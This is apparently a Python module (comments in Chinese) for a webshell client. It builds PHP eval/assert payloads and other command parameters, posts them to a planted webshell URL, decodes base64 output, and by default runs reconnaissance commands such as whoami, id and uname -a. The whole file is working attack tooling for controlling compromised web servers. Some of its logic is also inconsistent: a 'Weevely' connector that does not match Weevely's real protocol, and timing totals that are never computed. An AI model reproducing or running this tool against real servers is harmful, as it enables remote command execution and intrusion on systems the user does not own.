import aiohttp
import asyncio
import base64
from typing import List, Dict, Any, Optional
from loguru import logger
import time
from abc import ABC, abstractmethod
import json

from .config import config

class WebShellConnector(ABC):
    """WebShell连接器基类"""
    
    @abstractmethod
    async def execute(self, command: str, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """执行命令"""
        pass

class BaseConnector:
    """基础连接器类"""
    def prepare_request(self, command: str) -> Dict[str, str]:
        raise NotImplementedError()
        
    def process_response(self, response: str) -> str:
        return response.strip()

class PasswordConnector(BaseConnector):
    """密码型WebShell连接器"""
    def __init__(self, password: str = "test123", param_name: str = "cmd"):
        self.password = password
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        return {self.param_name: command}

class EvalConnector(BaseConnector):
    """Eval型WebShell连接器"""
    def __init__(self, param_name: str = "code"):
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        php_code = f'system("{command}");'
        return {self.param_name: php_code}

class ParameterConnector(BaseConnector):
    """参数型WebShell连接器（用于JSP/ASPX）"""
    def __init__(self, param_name: str = "cmd"):
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        return {self.param_name: command}

class WeevelyConnector(BaseConnector):
    """Weevely WebShell连接器"""
    def __init__(self, password: str):
        self.password = password
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        # Weevely使用特殊的编码方式
        encoded_cmd = base64.b64encode(command.encode()).decode()
        return {
            'pass': self.password,
            'cmd': encoded_cmd
        }
        
    def process_response(self, response: str) -> str:
        try:
            # Weevely的响应也是base64编码的
            return base64.b64decode(response).decode()
        except:
            return response

class CustomConnector(WebShellConnector):
    """自定义连接器"""
    def __init__(self, payload_template: str, **kwargs):
        self.payload_template = payload_template
        self.kwargs = kwargs
    
    async def execute(self, command: str, session: aiohttp.ClientSession) -> Dict[str, Any]:
        return {k: v.format(command=command) for k, v in self.kwargs.items()}

class AssertConnector(BaseConnector):
    """Assert型WebShell连接器"""
    def __init__(self, param_name: str = '_'):
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        php_code = f'system("{command}");'
        return {self.param_name: php_code}

class WebShellExecutor:
    def __init__(self, url: str, connector: WebShellConnector):
        self.url = url
        self.connector = connector
        self.session = None
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def execute_command(self, command: str) -> Dict[str, Any]:
        """执行单个命令"""
        start_time = time.time()
        try:
            # 获取请求数据
            data = await self.connector.execute(command, self.session)
            logger.debug(f"发送请求数据: {data}")
            
            # 发送请求
            async with self.session.post(self.url, data=data) as response:
                execution_time = time.time() - start_time
                content = await response.text()
                logger.debug(f"原始响应: {content}")
                
                try:
                    # 尝试解析JSON响应
                    result = json.loads(content)
                    if isinstance(result, dict):
                        if not result.get('success', False):
                            logger.error(f"WebShell执行错误: {result.get('error', '未知错误')}")
                            return {
                                'success': False,
                                'error': result.get('error', '未知错误'),
                                'execution_time': execution_time
                            }
                        
                        output = result.get('output', '')
                        if output:
                            try:
                                output = base64.b64decode(output).decode('utf-8')
                                logger.debug(f"解码后输出: {output}")
                            except Exception as e:
                                logger.error(f"Base64解码失败: {e}")
                        
                        return {
                            'success': True,
                            'output': output,
                            'execution_time': execution_time,
                            'status_code': response.status
                        }
                except json.JSONDecodeError:
                    # 如果不是JSON，尝试常规处理
                    output = content
                    try:
                        output = base64.b64decode(content).decode('utf-8')
                        logger.debug(f"解码后输出: {output}")
                    except Exception as e:
                        logger.error(f"Base64解码失败: {e}")
                        logger.debug(f"使用原始输出: {output}")
                    
                    success = response.status == 200 and output.strip() != ''
                    if not success:
                        logger.error(f"执行失败: status={response.status}, output={output}")
                    
                    return {
                        'success': success,
                        'output': output,
                        'execution_time': execution_time,
                        'status_code': response.status
                    }
                
        except Exception as e:
            logger.error(f"执行命令失败: {str(e)}")
            import traceback
            logger.debug(f"错误详情: {traceback.format_exc()}")
            return {
                'success': False,
                'error': str(e),
                'execution_time': time.time() - start_time
            }
    
    async def execute_commands(self, commands: List[str]) -> List[Dict[str, Any]]:
        """执行多个命令"""
        results = []
        for cmd in commands:
            result = await self.execute_command(cmd)
            results.append({
                'command': cmd,
                **result
            })
        return results

async def execute_command(url: str, command: str, connector: Any) -> Dict[str, Any]:
    """执行单个命令"""
    try:
        async with aiohttp.ClientSession() as session:
            # 准备请求数据
            data = connector.prepare_request(command)
            logger.debug(f"发送请求数据: {data}")
            
            # 发送请求
            async with session.post(url, data=data) as response:
                response_text = await response.text()
                logger.debug(f"原始响应: {response_text}")
                
                # 处理响应
                output = connector.process_response(response_text)
                logger.debug(f"处理后输出: {output}")
                
                if not output and response.status == 200:
                    logger.error(f"执行失败: status={response.status}, output={response_text}")
                    return {
                        'success': False,
                        'command': command,
                        'error': '命令执行失败或无输出'
                    }
                
                return {
                    'success': True,
                    'command': command,
                    'output': output
                }
                
    except Exception as e:
        logger.error(f"执行命令时发生错误: {str(e)}")
        return {
            'success': False,
            'command': command,
            'error': str(e)
        }

async def test_webshell(url: str, connector: BaseConnector, 
                       commands: Optional[List[str]] = None) -> Dict[str, Any]:
    """测试WebShell功能"""
    if commands is None:
        commands = [
            "whoami",
            "id",
            "pwd",
            "ls -la",
            "uname -a"
        ]
    
    results = []
    successful_commands = 0
    total_execution_time = 0
    
    for command in commands:
        result = await execute_command(url, command, connector)
        results.append(result)
        
        if result['success']:
            successful_commands += 1
            # 这里可以添加执行时间统计
    
    return {
        'total_commands': len(commands),
        'successful_commands': successful_commands,
        'average_execution_time': total_execution_time / len(commands) if len(commands) > 0 else 0,
        'total_execution_time': total_execution_time,
        'results': results
    }

# 预定义的连接器工厂
def create_connector(shell_type: str, **kwargs) -> BaseConnector:
    """创建对应类型的连接器"""
    connectors = {
        'password': PasswordConnector,
        'eval': EvalConnector,
        'parameter': ParameterConnector,
        'weevely': WeevelyConnector,
        'assert': AssertConnector
    }
    
    if shell_type not in connectors:
        raise ValueError(f"不支持的WebShell类型: {shell_type}")
        
    return connectors[shell_type](**kwargs)
